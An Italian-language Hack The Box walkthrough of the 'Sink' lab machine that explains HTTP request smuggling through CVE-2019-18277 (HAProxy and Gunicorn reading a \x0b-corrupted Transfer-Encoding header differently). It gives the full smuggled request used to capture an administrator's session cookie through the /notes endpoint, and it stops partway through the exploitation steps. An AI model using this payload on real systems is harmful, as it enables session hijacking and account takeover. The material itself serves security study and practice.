---
title: 'HTB Sink Walkthrough: HTTP Request Smuggling e AWS Privesc'
slug: htb-sink-walkthrough
description: 'Hack The Box Sink write-up: HTTP Request Smuggling, CVE-2019-18277, HAProxy, Gunicorn, Gitea, Ligolo-ng, AWS LocalStack, KMS e Secrets Manager.'
image: /htb-sink-walkthrough-hack-the-box.webp
draft: false
date: 2026-09-08T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - HTB Sink
  - HTB Walkthrough
  - HTTP Request Smuggling
  - CVE-2019-18277
  - AWS Privesc
---

# HTB Sink Walkthrough: HTTP Request Smuggling e Privilege Escalation

In questo walkthrough di HTB Sink vediamo come sfruttare una vulnerabilità di **HTTP Request Smuggling** legata a HAProxy e Gunicorn per ottenere la sessione dell'amministratore, accedere a Gitea e proseguire fino a root attraverso AWS LocalStack, Secrets Manager e KMS.

Sink è una macchina classificata **Insane** su HackTheBox — la difficoltà più alta della piattaforma. Proprio per questo si è rivelata un'ottima occasione per approfondire davvero l'HTTP Request Smuggling: non un CVE da lanciare con un tool automatico, ma un meccanismo da capire pezzo per pezzo, byte per byte, prima di riuscire a farlo funzionare in modo affidabile. Questo walkthrough segue esattamente quel percorso — compresi gli errori e i tentativi falliti lungo la strada, perché sono stati parte integrante di come si è arrivati a capire il bug.

## Informazioni sulla macchina

| Campo              | Valore                                      |
| ------------------ | ------------------------------------------- |
| Piattaforma        | Hack The Box                                |
| Nome               | Sink                                        |
| OS                 | Linux                                       |
| Difficoltà         | Insane                                      |
| Focus              | HTTP Request Smuggling                      |
| CVE                | CVE-2019-18277                              |
| Servizi principali | HAProxy, Gunicorn, Flask, Gitea, LocalStack |

***

## 1. Ricognizione iniziale

Scansione delle porte con [mynmap](https://github.com/hack-ita/mynmap) (wrapper custom per nmap, pensato per i CTF: fa in automatico discovery TCP veloce, service/OS detection, vulnerability check e UDP scan in sequenza). Sulla porta **3000** gira un'istanza **Gitea**, ma senza credenziali non c'è molto da vedere subito — repository privati, poco altro accessibile. Ci si sposta quindi sulla porta **5000**, dove gira un'applicazione web.

Un primo controllo veloce sugli header di risposta:

```bash
curl -sI http://sink.htb:5000/ | grep -iE "server|via|x-served|x-cache|cf-ray|x-amz"
```

```
Server: gunicorn/20.0.0
Via: haproxy
X-Served-By: c8361846ea2c
```

Due informazioni utili subito: il backend è **Gunicorn** (application server Python, usato per servire l'app Flask), e davanti c'è **HAProxy** come reverse proxy. Ogni volta che si vede questa combinazione — un front-end e un back-end distinti che si scambiano la stessa richiesta — vale la pena controllare se i due interpretano la lunghezza del body in modo diverso.

Una ricerca veloce su vulnerabilità note di Gunicorn 20.0.0 non porta a nulla di utilizzabile — i risultati trovati riguardano CVE troppo recenti per essere plausibili sull'epoca di questa macchina. Meglio quindi concentrarsi su **HAProxy**, che però non dichiara la sua versione da nessuna parte a un primo sguardo.

**Trucco per farla uscire allo scoperto:** mandando in Burp Repeater una richiesta volutamente troncata/malformata (es. una `GET /notes` senza header completi, tagliata a metà), HAProxy non riesce a instradarla correttamente al backend e risponde lui stesso con una pagina d'errore **400 Bad Request** — e quella pagina d'errore, generata direttamente da HAProxy, include sempre l'header `Server: haproxy X.Y.Z` con la versione esatta. Un modo pulito per fingerprintare il front-end senza nemmeno toccare il backend.

L'app espone anche alcune funzionalità utili come punto d'appoggio per l'attacco: un sistema di note (`/notes`) e commenti (`/comment`), entrambi collegati alla sessione dell'utente loggato.

***

## 2. HTTP Request Smuggling

Prima di lanciare qualsiasi payload, è stato necessario capire davvero **perché** il bug esiste, non solo copiare un exploit. Il ragionamento è stato ricostruito passo passo. Per una guida di riferimento più generale sull'HTTP Request Smuggling (CL.TE, TE.CL, cache poisoning, furto cookie), vedi anche [HTTP Request Smuggling: Desync, Cache Poisoning e Cookie Theft](https://hackita.it/articoli/http-request-smuggling/) su Hackita.

### 2.1 Content-Length vs Transfer-Encoding

Un server HTTP/1.1 può sapere dove finisce il body di una richiesta in due modi alternativi:

* **`Content-Length`** — dichiara il numero esatto di byte del body. Esempio semplice: se mando la parola "hackita" (7 lettere), scrivo `Content-Length: 7`, e il server legge esattamente 7 byte e si ferma lì.
* **`Transfer-Encoding: chunked`** — il body arriva "a pezzi" invece che tutto insieme. Ogni pezzo (chunk) inizia con un numero che dice quanti byte di dati contiene *quel pezzo specifico*, poi arrivano i dati. Si può mandare `1` seguito da un solo byte, poi un altro `1` seguito da un altro byte, e così via. Il pezzo speciale `0` non ha dati dopo — è il segnale "ho finito, non mando altro". Questo comportamento (compreso il significato del chunk `0`) è definito nella specifica ufficiale di HTTP/1.1, la **RFC 7230**.

La **RFC 7230** è, in una riga, il documento ufficiale che stabilisce come deve funzionare HTTP/1.1 — comprese le regole su Content-Length e Transfer-Encoding di cui parliamo qui.

**Perché esiste il chunked, in pratica:** `Content-Length` funziona bene solo se si sa *in anticipo* quanto è grande il dato da mandare. Ma non è sempre così — pensare a uno streaming live, un file generato al volo, o una risposta che il server sta ancora componendo mentre la invia: in questi casi il server non ha idea di quanti byte totali manderà finché non ha finito. Il chunked risolve proprio questo: manda quello che ha pronto, un pezzo alla volta, senza dover sapere il totale in anticipo — e il destinatario capisce che è finito solo quando arriva il chunk `0`.

Se in una richiesta sono presenti **entrambi** gli header, la RFC 7230 impone che vinca **sempre** `Transfer-Encoding`, ignorando `Content-Length`. Questa regola è il cuore di tutto: è proprio perché TE vince sempre su CL (quando viene riconosciuto) che, più avanti, Gunicorn finisce per seguire TE mentre HAProxy segue CL — la stessa regola applicata da due server che vedono due versioni diverse dello stesso header. È il comportamento corretto e atteso — ma è anche il punto di partenza del bug: se due server diversi (front-end e back-end) non applicano questa regola nello stesso identico modo sulla stessa identica richiesta, nasce un disaccordo su dove finisce un messaggio e dove inizia il successivo.

### 2.2 CVE-2019-18277 e HAProxy

Googlando informazioni più specifiche su HAProxy legate a questo tipo di conflitto CL/TE, salta fuori l'articolo che descrive esattamente il bug in questione: [nathandavison.com/blog/haproxy-http-request-smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling) (CVE-2019-18277).

HAProxy, nelle versioni vulnerabili (incluse quelle usate su Sink), gestisce correttamente il conflitto CL/TE **quando l'header `Transfer-Encoding` è scritto in modo pulito**. Ma se si inserisce un carattere di controllo — nello specifico `\x0b` (tabulazione verticale) o `\x0c` (form feed) — subito dopo i due punti dell'header, prima della parola `chunked`:

```
Transfer-Encoding:[\x0b]chunked
```

HAProxy **non riconosce più** questo come un `Transfer-Encoding` valido. Di conseguenza:

1. Smette di considerare il chunked encoding.
2. Ripiega su `Content-Length` per decidere dove finisce la richiesta.
3. **Non rimuove** l'header `Transfer-Encoding` rotto dalla richiesta che inoltra al backend — lo lascia scritto così com'è, e lo manda avanti.

Questo da solo non basta a creare lo smuggling: se anche il backend ignorasse quell'header malformato (comportamento corretto secondo RFC 7230), i due server sarebbero comunque d'accordo (entrambi userebbero Content-Length) e non ci sarebbe nessun disaccordo.

**Come inserire il byte `\x0b` in Burp.** Digitare direttamente un carattere non stampabile come `\x0b` nell'editor di Burp non è pratico — molti editor lo ignorano o lo trasformano. Il modo usato per generarlo e inserirlo correttamente:

```bash
echo "\x0b" | base64
```

Questo produce una stringa base64 che rappresenta quel byte. Copiando quella stringa e usando la funzione **Decode** di Burp (tab Decoder, o selezionando il testo nell'editor e scegliendo "Base64 decode" dal menu contestuale), si ottiene il byte grezzo `\x0b` incollato direttamente nel punto giusto della richiesta, tra i due punti di `Transfer-Encoding:` e la parola `chunked` — aggirando il problema di scriverlo a mano.

### 2.3 Il comportamento di Gunicorn

Gunicorn (nelle versioni/configurazioni vulnerabili, come quella dietro Sink) **non rifiuta** l'header `Transfer-Encoding` malformato. Invece lo "ripulisce" internamente (rimuove il carattere di controllo) e lo accetta come `chunked` valido.

Nel caso di Sink, HAProxy e Gunicorn finiscono quindi per interpretare diversamente la stessa identica richiesta HTTP. In parole semplici: HAProxy vede il byte strano `\x0b`, non lo capisce, ma non lo cancella — lo lascia scritto e manda avanti la richiesta così com'è, usando lui `Content-Length` per decidere dove fermarsi. Gunicorn la rilegge da capo, ci trova lo stesso `Transfer-Encoding` (ancora presente, non rimosso da HAProxy) e, invece di scartarlo come dovrebbe, lo accetta — e siccome tra i due header vince sempre `Transfer-Encoding` quando è riconosciuto, Gunicorn finisce per usare quello. Risultato: due server, stessa richiesta, due letture diverse — ed è proprio questo disaccordo che permette di inserire una seconda richiesta nascosta sulla connessione verso il backend.

### 2.4 Connection reuse e keep-alive — il "tubo" condiviso

HAProxy, per efficienza, non apre una connessione TCP nuova verso il backend per ogni singola richiesta — ne tiene aperte poche, e le **riusa** per servire le richieste di più utenti diversi in sequenza (keep-alive / connection pooling).

Un modo semplice per immaginarlo: pensare a un tubo unico che collega HAProxy a Gunicorn, dentro cui passano, una dopo l'altra, le richieste di tanti utenti diversi — non un tubo a persona, uno condiviso da tutti. Questo è esattamente ciò che rende lo smuggling pericoloso: se un attaccante manda una richiesta che lascia il backend "in attesa" di altri byte per considerarsi completa, e subito dopo — sullo stesso tubo — passa la richiesta di un altro utente reale, quei byte in più (request line, header, cookie compreso) vengono letti come se fossero la continuazione della richiesta dell'attaccante, invece che una richiesta a sé.

Non c'è controllo su quale tubo specifico viene usato né su chi lo riuserà subito dopo — per questo l'attacco va spesso ripetuto più volte prima di "pescare" il momento giusto.

***

## 3. Verifica della vulnerabilità

### 3.1 Test diagnostico

Il primo istinto è stato costruire una richiesta con un body chunked **volutamente incompleto** (senza il chunk terminatore `0\r\n\r\n`) e un `Content-Length` corto:

```
POST /notes HTTP/1.1
Host: <target>:5000
Content-Length: 4
Transfer-Encoding: chunked
Cookie: session=...

1
Z
```

Questo va effettivamente in timeout — ma **non dimostra nulla**, perché un body chunked incompleto blocca *qualsiasi* server che legga correttamente il chunked, vulnerabile o no. Non isola il bug specifico.

### 3.2 Confronto con/senza \x0b

Per isolare davvero il bug bisogna usare lo stesso identico body chunked (un unico chunk da un byte: `1\r\nZ`, senza il chunk terminatore `0\r\n\r\n` finale) e confrontare il comportamento **con e senza** il byte `\x0b` nell'header:

* **Senza `\x0b`**: HAProxy legge correttamente `Transfer-Encoding`, ignora il `Content-Length` corto, inoltra il messaggio per intero → risposta normale, nessun timeout.
* **Con `\x0b`**: HAProxy ripiega su `Content-Length`, taglia la richiesta a metà (proprio prima del chunk terminatore che il body dovrebbe avere), il backend (che legge TE) resta in attesa di un chunk finale che non arriverà mai → timeout vero (visibile come richiesta "pending" a lungo o un errore esplicito, non una semplice lentezza percepita).

Solo la **differenza** fra questi due comportamenti prova il bug in modo pulito. Su Sink, avendo a disposizione un punto d'appoggio diretto (`/notes`, che mostra il contenuto salvato), il test diagnostico diventa secondario: si può passare direttamente all'exploit reale e osservare il risultato concreto.

Un avviso importante: anche il test "pulito" ha un limite pratico, emerso durante i test reali. Endpoint come `/notes` o `/comment` hanno comunque un minimo di latenza normale (scrittura su disco/database), che può assomigliare a un ritardo "sospetto" anche quando non c'è nessun disaccordo CL/TE in corso. Un'attesa di uno o due secondi percepita a occhio, senza un errore esplicito di Burp (un vero timeout, o un 504 Gateway Timeout restituito da HAProxy stesso), **non è una conferma affidabile** — è facile scambiarla per un falso positivo. La tecnica del timing resta un indizio probabilistico, non una prova definitiva quanto vedere concretamente i dati catturati in chiaro.

***

## 4. Exploit: catturare la sessione admin

### 4.1 Struttura del payload

L'idea è mandare **una singola richiesta HTTP** che HAProxy vede come un blocco unico e completo, ma che Gunicorn legge come **due richieste separate**:

1. Una prima richiesta (es. `POST /` o `POST /home`), con `Content-Length` e `Transfer-Encoding` in conflitto (bug HAProxy).
2. Un chunk `0` che chiude — dal punto di vista di Gunicorn (che legge TE) — questa prima richiesta.
3. Subito dopo, l'inizio di una **seconda richiesta HTTP nascosta** (`POST /notes`), con un `Content-Length` **volutamente più grande** del contenuto effettivamente inviato — così Gunicorn la considera incompleta e resta in attesa di altri byte per completarla.

```
POST / HTTP/1.1
Host: <target>:5000
Content-Length: <N>
Transfer-Encoding:[\x0b]chunked
Cookie: session=<sessione attaccante>

0

POST /notes HTTP/1.1
Host: <target>:5000
Content-Length: 290
Cookie: session=<sessione attaccante>

note=
```

**Perché quello `0` è fondamentale.** È il chunk che dice a Gunicorn "la prima richiesta finisce qui". Senza di esso, Gunicorn (che legge in modalità chunked) non ha mai un punto in cui considerare chiusa la prima richiesta — continua a leggere tutto come se fosse un unico blocco confuso, e il `POST /notes` che segue non viene mai riconosciuto come una richiesta a sé. Il risultato pratico, visto durante i test, è un errore di parsing (`Invalid Request Line`). Con lo `0` al posto giusto, invece, Gunicorn chiude correttamente la prima richiesta e passa a leggere quello che segue come l'inizio di una richiesta nuova — esattamente il comportamento che serve per l'attacco.

**Il senso del `Content-Length: 290` nella richiesta nascosta.** Qui si dichiara un numero (290) più alto di quanto viene effettivamente mandato (`note=`, pochi byte). Gunicorn legge quei pochi byte, vede che non bastano a raggiungere 290, e resta **in attesa** — pensa "manca ancora roba per completare questa richiesta". Quella parte mancante è esattamente lo spazio che, un attimo dopo, viene riempito dalla richiesta successiva che arriva sulla stessa connessione condivisa: se è la richiesta di un altro utente reale, i suoi byte (header, cookie compreso) finiscono incollati lì, fino a raggiungere i 290 dichiarati.

Un altro punto critico, scoperto con un errore concreto durante i test: **il `Content-Length` della prima richiesta deve coprire esattamente tutti i byte** che seguono la riga vuota, fino alla fine di `note=` incluso — chunk `0`, riga vuota, tutta la richiesta `POST /notes` con i suoi header, riga vuota, `note=`. Un valore sbagliato (troppo corto) taglia a metà una riga di header della richiesta nascosta, mandando in confusione Gunicorn nei tentativi successivi sulla stessa connessione (errori tipo `Invalid HTTP request line: 'Length: 290'`, sintomo di un taglio avvenuto proprio dentro la parola `Content-Length`).

Lasciare che Burp ricalcoli automaticamente il `Content-Length` della prima richiesta (funzione "Update Content-Length" attiva) si è rivelato più affidabile che calcolarlo a mano — mentre il `Content-Length: 290` della richiesta nascosta va impostato manualmente, apposta più alto del necessario.

### 4.2 Il punto d'appoggio /notes

Lo smuggling da solo cattura byte grezzi sulla connessione — serve comunque un modo per **vederli**. Le opzioni tipiche sono:

* Un endpoint che **salva e mostra** ciò che gli viene inviato (qui: `/notes`) — la richiesta rubata finisce salvata come testo, leggibile con calma in un secondo momento.
* Un "reflection gadget" — una pagina che rispecchia nella risposta HTTP quello che le viene mandato nel body, permettendo di vedere il risultato immediatamente.
* Response queue poisoning — tecnica più avanzata per ricevere direttamente la risposta destinata alla vittima, quando non è disponibile nessuno dei due punti sopra.

Su Sink, `/notes` fa esattamente al caso: ogni nota creata viene mostrata per intero nell'interfaccia web dell'utente loggato.

### 4.3 Connection pool e richiesta della vittima

![Diagramma del flusso di HTTP Request Smuggling su HTB Sink](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgOTAwIDk4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBmb250LWZhbWlseT0iQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CiAgPGRlZnM+CiAgICA8bWFya2VyIGlkPSJhcnJvdyIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iIzExMTExMSIvPgogICAgPC9tYXJrZXI+CiAgICA8bWFya2VyIGlkPSJhcnJvd1JlZCIgdmlld0JveD0iMCAwIDEwIDEwIiByZWZYPSI5IiByZWZZPSI1IiBtYXJrZXJXaWR0aD0iOCIgbWFya2VySGVpZ2h0PSI4IiBvcmllbnQ9ImF1dG8tc3RhcnQtcmV2ZXJzZSI+CiAgICAgIDxwYXRoIGQ9Ik0wLDAgTDEwLDUgTDAsMTAgeiIgZmlsbD0iI2RjMjYyNiIvPgogICAgPC9tYXJrZXI+CiAgPC9kZWZzPgoKICA8cmVjdCB3aWR0aD0iOTAwIiBoZWlnaHQ9Ijk4MCIgZmlsbD0iI2ZmZmZmZiIvPgogIDx0ZXh0IHg9IjQ1MCIgeT0iMzQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMjAiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiMxMTExMTEiPkhUVFAgUmVxdWVzdCBTbXVnZ2xpbmcg4oCUIENWRS0yMDE5LTE4Mjc3PC90ZXh0PgogIDx0ZXh0IHg9IjQ1MCIgeT0iNTYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtc2l6ZT0iMTMiIGZpbGw9IiM1NTU1NTUiPkZsdXNzbyBkaSBjYXR0dXJhIGRlbGxhIHNlc3Npb25lIGFkbWluIHN1IEhUQiBTaW5rPC90ZXh0PgoKICA8IS0tIFN0ZXAgMSAtLT4KICA8cmVjdCB4PSI2MCIgeT0iOTAiIHdpZHRoPSI3ODAiIGhlaWdodD0iODAiIHJ4PSIxMCIgZmlsbD0iIzExMTExMSIvPgogIDx0ZXh0IHg9IjkwIiB5PSIxMTgiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNkYzI2MjYiPjE8L3RleHQ+CiAgPHRleHQgeD0iMTIwIiB5PSIxMTgiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI2MDAiIGZpbGw9IiNmZmZmZmYiPkF0dGFjY2FudGUg4oaSIEhBUHJveHk8L3RleHQ+CiAgPHRleHQgeD0iMTIwIiB5PSIxNDAiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IiNjY2NjY2MiPlJpY2hpZXN0YSBjb24gQ29udGVudC1MZW5ndGggKyBUcmFuc2Zlci1FbmNvZGluZzpbXHgwYl1jaHVua2VkPC90ZXh0PgogIDx0ZXh0IHg9IjEyMCIgeT0iMTU4IiBmb250LXNpemU9IjEyIiBmaWxsPSIjY2NjY2NjIj5JbCBieXRlIFx4MGIgw6ggbmFzY29zdG8gdHJhIGkgZHVlIHB1bnRpIGUgbGEgcGFyb2xhICJjaHVua2VkIjwvdGV4dD4KCiAgPGxpbmUgeDE9IjQ1MCIgeTE9IjE3MCIgeDI9IjQ1MCIgeTI9IjIwNCIgc3Ryb2tlPSIjZGMyNjI2IiBzdHJva2Utd2lkdGg9IjIuNSIgbWFya2VyLWVuZD0idXJsKCNhcnJvd1JlZCkiLz4KCiAgPCEtLSBTdGVwIDIgLS0+CiAgPHJlY3QgeD0iNjAiIHk9IjIwNiIgd2lkdGg9Ijc4MCIgaGVpZ2h0PSI5MCIgcng9IjEwIiBmaWxsPSIjZGMyNjI2Ii8+CiAgPHRleHQgeD0iOTAiIHk9IjIzNCIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iIzExMTExMSI+MjwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjIzNCIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+SEFQcm94eTogXHgwYiBub24gcmljb25vc2NpdXRvPC90ZXh0PgogIDx0ZXh0IHg9IjEyMCIgeT0iMjU2IiBmb250LXNpemU9IjEyIiBmaWxsPSIjZmZmZmZmIj5SaXBpZWdhIHN1IENvbnRlbnQtTGVuZ3RoIHBlciBkZWNpZGVyZSBkb3ZlIGZpbmlzY2UgbGEgcmljaGllc3RhPC90ZXh0PgogIDx0ZXh0IHg9IjEyMCIgeT0iMjc0IiBmb250LXNpemU9IjEyIiBmaWxsPSIjZmZmZmZmIj5NYSBOT04gcmltdW92ZSBpbCBUcmFuc2Zlci1FbmNvZGluZyByb3R0byDigJQgbG8gaW5vbHRyYSBjb3PDrCBjb20nw6g8L3RleHQ+CgogIDxsaW5lIHgxPSI0NTAiIHkxPSIyOTYiIHgyPSI0NTAiIHkyPSIzMzAiIHN0cm9rZT0iIzExMTExMSIgc3Ryb2tlLXdpZHRoPSIyLjUiIG1hcmtlci1lbmQ9InVybCgjYXJyb3cpIi8+CgogIDwhLS0gU3RlcCAzIC0tPgogIDxyZWN0IHg9IjYwIiB5PSIzMzIiIHdpZHRoPSI3ODAiIGhlaWdodD0iMTEwIiByeD0iMTAiIGZpbGw9IiMxMTExMTEiLz4KICA8dGV4dCB4PSI5MCIgeT0iMzYwIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZGMyNjI2Ij4zPC90ZXh0PgogIDx0ZXh0IHg9IjEyMCIgeT0iMzYwIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iNjAwIiBmaWxsPSIjZmZmZmZmIj5HdW5pY29ybiByaWxlZ2dlIGxhIHJpY2hpZXN0YTwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjM4MiIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2NjY2NjYyI+VHJvdmEgYW5jb3JhIGlsIFRyYW5zZmVyLUVuY29kaW5nLCBsbyBhY2NldHRhIGNvbWUgY2h1bmtlZCB2YWxpZG88L3RleHQ+CiAgPHRleHQgeD0iMTIwIiB5PSI0MDAiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IiNjY2NjY2MiPlRyb3ZhIGlsIGNodW5rICIwIiDihpIgY2hpdWRlIGxhIHByaW1hIHJpY2hpZXN0YTwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjQxOCIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2NjY2NjYyI+TGVnZ2UgUE9TVCAvbm90ZXMgY29uIENvbnRlbnQtTGVuZ3RoOiAyOTAsIHBvY2hpIGJ5dGUgcmljZXZ1dGkg4oaSIHJlc3RhIGluIEFUVEVTQTwvdGV4dD4KCiAgPGxpbmUgeDE9IjQ1MCIgeTE9IjQ0MiIgeDI9IjQ1MCIgeTI9IjQ3NiIgc3Ryb2tlPSIjZGMyNjI2IiBzdHJva2Utd2lkdGg9IjIuNSIgbWFya2VyLWVuZD0idXJsKCNhcnJvd1JlZCkiLz4KCiAgPCEtLSBTdGVwIDQgLS0+CiAgPHJlY3QgeD0iNjAiIHk9IjQ3OCIgd2lkdGg9Ijc4MCIgaGVpZ2h0PSI4MCIgcng9IjEwIiBmaWxsPSIjZGMyNjI2Ii8+CiAgPHRleHQgeD0iOTAiIHk9IjUwNiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iIzExMTExMSI+NDwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjUwNiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+Vml0dGltYSAoYWRtaW4pIOKGkiBIQVByb3h5PC90ZXh0PgogIDx0ZXh0IHg9IjEyMCIgeT0iNTI4IiBmb250LXNpemU9IjEyIiBmaWxsPSIjZmZmZmZmIj5SaWNoaWVzdGEgcmVhbGUsIGVzLiBHRVQgL25vdGVzL2RlbGV0ZS8xMjM0LCBjb24gaWwgc3VvIGNvb2tpZSBkaSBzZXNzaW9uZTwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjU0NiIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZmZmZiI+SW5zdHJhZGF0YSBkYSBIQVByb3h5IHN1bGxhIHN0ZXNzYSBjb25uZXNzaW9uZSByaXVzYXRhIChrZWVwLWFsaXZlKTwvdGV4dD4KCiAgPGxpbmUgeDE9IjQ1MCIgeTE9IjU1OCIgeDI9IjQ1MCIgeTI9IjU5MiIgc3Ryb2tlPSIjMTExMTExIiBzdHJva2Utd2lkdGg9IjIuNSIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiLz4KCiAgPCEtLSBTdGVwIDUgLS0+CiAgPHJlY3QgeD0iNjAiIHk9IjU5NCIgd2lkdGg9Ijc4MCIgaGVpZ2h0PSI5MCIgcng9IjEwIiBmaWxsPSIjMTExMTExIi8+CiAgPHRleHQgeD0iOTAiIHk9IjYyMiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2RjMjYyNiI+NTwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjYyMiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9IjYwMCIgZmlsbD0iI2ZmZmZmZiI+R3VuaWNvcm4gaW5jb2xsYSBpIGJ5dGUgZGVsbGEgdml0dGltYTwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjY0NCIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2NjY2NjYyI+UmllbXBpb25vIGxvIHNwYXppbyBtYW5jYW50ZSBkaWNoaWFyYXRvIGRhbCBDb250ZW50LUxlbmd0aCBkaSBQT1NUIC9ub3RlczwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9IjY2MiIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2NjY2NjYyI+UmVxdWVzdCBsaW5lLCBoZWFkZXIgZSBjb29raWUgZGVsbGEgdml0dGltYSBmaW5pc2Nvbm8gZGVudHJvIGlsIGJvZHk8L3RleHQ+CgogIDxsaW5lIHgxPSI0NTAiIHkxPSI2ODQiIHgyPSI0NTAiIHkyPSI3MTgiIHN0cm9rZT0iI2RjMjYyNiIgc3Ryb2tlLXdpZHRoPSIyLjUiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIi8+CgogIDwhLS0gU3RlcCA2IC0tPgogIDxyZWN0IHg9IjYwIiB5PSI3MjAiIHdpZHRoPSI3ODAiIGhlaWdodD0iODAiIHJ4PSIxMCIgZmlsbD0iI2RjMjYyNiIvPgogIDx0ZXh0IHg9IjkwIiB5PSI3NDgiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiMxMTExMTEiPjY8L3RleHQ+CiAgPHRleHQgeD0iMTIwIiB5PSI3NDgiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI2MDAiIGZpbGw9IiNmZmZmZmYiPlJpc3VsdGF0bzogY2F0dHVyYSByaXVzY2l0YTwvdGV4dD4KICA8dGV4dCB4PSIxMjAiIHk9Ijc3MCIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZmZmZiI+TGEgbm90YSBzYWx2YXRhIG5lbGwnYWNjb3VudCBkZWxsJ2F0dGFjY2FudGUgY29udGllbmUgbGEgcmljaGllc3RhIGRlbGxhIHZpdHRpbWE8L3RleHQ+CiAgPHRleHQgeD0iMTIwIiB5PSI3ODgiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IiNmZmZmZmYiPmluY2x1c28gaWwgY29va2llIGRpIHNlc3Npb25lIGRlbGwnYW1taW5pc3RyYXRvcmU8L3RleHQ+CgogIDwhLS0gTGVnZW5kIC0tPgogIDxyZWN0IHg9IjYwIiB5PSI4MzAiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgZmlsbD0iIzExMTExMSIvPgogIDx0ZXh0IHg9Ijg2IiB5PSI4NDQiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IiMxMTExMTEiPlBhc3NhZ2dpbyBzdWxsYSBjb25uZXNzaW9uZSBjb25kaXZpc2EgKGtlZXAtYWxpdmUpPC90ZXh0PgogIDxyZWN0IHg9IjYwIiB5PSI4NTgiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgZmlsbD0iI2RjMjYyNiIvPgogIDx0ZXh0IHg9Ijg2IiB5PSI4NzIiIGZvbnQtc2l6ZT0iMTIiIGZpbGw9IiMxMTExMTEiPlB1bnRvIGNyaXRpY28gZGVsIGJ1ZyAoYnl0ZSBceDBiLCByaWNoaWVzdGEgdml0dGltYSwgY2F0dHVyYSk8L3RleHQ+CgogIDx0ZXh0IHg9IjYwIiB5PSI5MTAiIGZvbnQtc2l6ZT0iMTEiIGZpbGw9IiM3Nzc3NzciPkhBUHJveHkgZSBHdW5pY29ybiBsZWdnb25vIGxhIHN0ZXNzYSByaWNoaWVzdGEgaW4gZHVlIG1vZGkgZGl2ZXJzaTo8L3RleHQ+CiAgPHRleHQgeD0iNjAiIHk9IjkyOCIgZm9udC1zaXplPSIxMSIgZmlsbD0iIzc3Nzc3NyI+SEFQcm94eSBzZWd1ZSBDb250ZW50LUxlbmd0aCwgR3VuaWNvcm4gc2VndWUgVHJhbnNmZXItRW5jb2Rpbmcg4oCUIHF1ZXN0byBkaXNhY2NvcmRvIMOoIGlsIGN1b3JlIGRlbGwnYXR0YWNjby48L3RleHQ+CiAgPHRleHQgeD0iNjAiIHk9Ijk1NCIgZm9udC1zaXplPSIxMSIgZmlsbD0iIzk5OTk5OSI+aGFja2l0YS5pdCDigJQgQ1ZFLTIwMTktMTgyNzcgLyBIVEIgU2luazwvdGV4dD4KPC9zdmc+Cg==)

1. La richiesta malformata dell'attaccante viene inviata. HAProxy, ingannato dal byte `\x0b`, la considera un'unica richiesta completa e la inoltra a Gunicorn sulla connessione persistente (keep-alive) verso il backend.
2. Gunicorn, leggendo in modalità chunked, trova il chunk `0` e considera conclusa la prima richiesta.
3. Continua a leggere sulla stessa connessione: trova l'inizio di `POST /notes`, con un `Content-Length: 290` dichiarato ma solo pochi byte (`note=`) effettivamente ricevuti — resta quindi **in attesa** di altri byte per considerare completa questa seconda richiesta.
